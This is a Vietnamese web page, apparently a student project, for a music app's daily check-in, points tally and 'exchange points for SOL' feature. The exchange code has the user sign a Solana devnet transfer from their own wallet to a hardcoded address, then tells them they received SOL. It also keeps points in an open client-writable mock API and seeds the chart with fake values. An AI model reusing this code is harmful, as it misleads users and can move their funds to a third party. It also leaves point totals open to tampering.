<!DOCTYPE html>
<html lang="vi">
  <head>
    <meta charset="UTF-8" />
    <title>Nhiệm Vụ Hàng Ngày</title>
    <link rel="stylesheet" href="style_daily_task.css" />
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <!-- Đảm bảo buffer được tải từ CDN -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/buffer/6.0.3/index.min.js"></script>
    <script>
      // Gán Buffer vào window sau khi tải buffer từ CDN
      window.Buffer = window.Buffer || buffer.Buffer;
    </script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js@3.9.1/dist/chart.min.js"></script>
  </head>
  <body>
    <h1>Nhiệm Vụ Hàng Ngày</h1>
    <div class="task-container">
      <p>Điểm của bạn: <span id="points">0</span></p>
      <p>Số bài hát đã nghe hôm nay: <span id="songsToday">0</span></p>
      <p>Tổng số bài hát đã nghe: <span id="totalSongs">0</span></p>
      <p>Số lần đã điểm danh: <span id="checkInCount">0</span></p>
      <button id="checkInButton">Điểm danh hôm nay</button>
      <button id="exchangeButton">Đổi điểm ra SOL</button>
      <p class="message" id="message"></p>
      <canvas id="dailyChart" class="chart"></canvas>
    </div>

    <script>
      const userId = localStorage.getItem("userId");
      const userApiUrl = `https://65bf081adcfcce42a6f31afe.mockapi.io/phuczk/demo_crud_api142857/user/${userId}`;
      let points = 0;
      let songsToday = 0;
      let totalSongs = 0;
      let lastCheckInDate = "";
      let checkInCount = 0;
      let dailyPoints = [250, 500, 360, 900, 910, 1200, 500];

      // Khởi tạo biểu đồ
      const ctx = document.getElementById("dailyChart").getContext("2d");
      const dailyChart = new Chart(ctx, {
        type: "line",
        data: {
          labels: [],
          datasets: [
            {
              label: "Điểm Hàng Ngày",
              data: dailyPoints,
              fill: false,
              borderColor: "#16b335",
              tension: 0.1,
            },
          ],
        },
      });

      function updateChartData() {
        const chartLabels = [];
        for (let i = 6; i >= 0; i--) {
          const date = new Date();
          date.setDate(date.getDate() - i);
          chartLabels.push(date.toLocaleDateString());
        }
        dailyChart.data.labels = chartLabels;
        dailyChart.data.datasets[0].data = dailyPoints;
        dailyChart.update();
      }

      async function loadUserData() {
        try {
          const response = await fetch(userApiUrl);
          if (!response.ok)
            throw new Error("Không lấy được dữ liệu người dùng.");
          const userData = await response.json();
          points = userData.point;
          songsToday = userData.songsToday;
          totalSongs = userData.songHeard;
          lastCheckInDate = userData.lastCheckInDate || "";
          checkInCount = userData.checkInCount || 0; // Lấy số lần điểm danh
          document.getElementById("points").textContent = points;
          document.getElementById("songsToday").textContent = songsToday;
          document.getElementById("totalSongs").textContent = totalSongs;
          document.getElementById("checkInCount").textContent = checkInCount; // Hiển thị số lần điểm danh
          updateChartData();
        } catch (error) {
          console.error("Lỗi khi lấy dữ liệu người dùng:", error);
        }
      }

      function isNewDay() {
        const currentDate = new Date().toLocaleDateString();
        return lastCheckInDate !== currentDate;
      }

      async function updatePointsAndSongs() {
        if (isNewDay()) {
          points += 10;
          songsToday = 1;
          totalSongs += 1;
          checkInCount += 1; // Tăng số lần điểm danh
          lastCheckInDate = new Date().toLocaleDateString();
          const updatedData = {
            point: points,
            songsToday: songsToday,
            songHeard: totalSongs,
            checkInCount: checkInCount, // Cập nhật số lần điểm danh
            lastCheckInDate: lastCheckInDate,
          };

          try {
            const response = await fetch(userApiUrl, {
              method: "PUT",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(updatedData),
            });
            if (response.ok) {
              document.getElementById("points").textContent = points;
              document.getElementById("songsToday").textContent = songsToday;
              document.getElementById("totalSongs").textContent = totalSongs;
              document.getElementById("checkInCount").textContent =
                checkInCount; // Cập nhật hiển thị số lần điểm danh
              document.getElementById("message").textContent =
                "Bạn đã điểm danh và được cộng 10 điểm!";
              dailyPoints.push(10);
              updateChartData();
            } else {
              throw new Error("Không cập nhật được dữ liệu.");
            }
          } catch (error) {
            console.error("Lỗi khi cập nhật dữ liệu:", error);
            document.getElementById("message").textContent =
              "Đã xảy ra lỗi khi cập nhật điểm và số lần nghe.";
          }
        } else {
          document.getElementById("message").textContent =
            "Bạn đã điểm danh hôm nay rồi!";
        }
      }

      async function connectWallet() {
        if (window.solana && window.solana.isPhantom) {
          try {
            const resp = await window.solana.connect();
            console.log(
              `Kết nối thành công, public key: ${resp.publicKey.toString()}`
            );
            return resp.publicKey.toString();
          } catch (err) {
            console.error("Lỗi kết nối ví:", err);
            return null;
          }
        } else {
          alert("Vui lòng cài đặt Phantom Wallet.");
          return null;
        }
      }

      async function exchangePointsToSOL() {
        const conversionRate = 0.01;
        const minPointsForExchange = 100;

        if (points >= minPointsForExchange) {
          const solAmount = (points / 100) * conversionRate;
          const recipientPublicKey = await connectWallet();

          if (recipientPublicKey) {
            try {
              const toPubkey = new solanaWeb3.PublicKey(
                "FqSyC5QGtUYHpbRKvCF9yZGTgUEhuLfeADXJoi1tvQi2"
              );
              const connection = new solanaWeb3.Connection(
                solanaWeb3.clusterApiUrl("devnet"),
                "confirmed"
              );

              const transaction = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                  fromPubkey: new solanaWeb3.PublicKey(recipientPublicKey),
                  toPubkey: toPubkey,
                  lamports: solanaWeb3.LAMPORTS_PER_SOL * solAmount,
                })
              );

              const { blockhash, lastValidBlockHeight } =
                await connection.getLatestBlockhash();
              transaction.recentBlockhash = blockhash;
              transaction.feePayer = new solanaWeb3.PublicKey(
                recipientPublicKey
              );

              const signedTransaction = await window.solana.signTransaction(
                transaction
              );
              const signature = await connection.sendRawTransaction(
                signedTransaction.serialize(),
                {
                  skipPreflight: false,
                }
              );

              await connection.confirmTransaction({
                signature,
                blockhash,
                lastValidBlockHeight,
              });

              console.log("Transaction Signature:", signature);

              // Cập nhật lại điểm
              points = 0;
              await fetch(userApiUrl, {
                method: "PUT",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ point: points }),
              });

              document.getElementById("points").textContent = points;
              document.getElementById(
                "message"
              ).textContent = `Bạn đã đổi ${solAmount.toFixed(
                4
              )} SOL thành công!`;
            } catch (error) {
              console.error("Lỗi khi thực hiện giao dịch:", error);
              document.getElementById("message").textContent =
                "Đã xảy ra lỗi khi thực hiện giao dịch.";
            }
          }
        } else {
          document.getElementById("message").textContent =
            "Bạn cần ít nhất 100 điểm để đổi ra SOL!";
        }
      }

      document
        .getElementById("checkInButton")
        .addEventListener("click", updatePointsAndSongs);
      document
        .getElementById("exchangeButton")
        .addEventListener("click", exchangePointsToSOL);

      loadUserData();
    </script>
  </body>
</html>
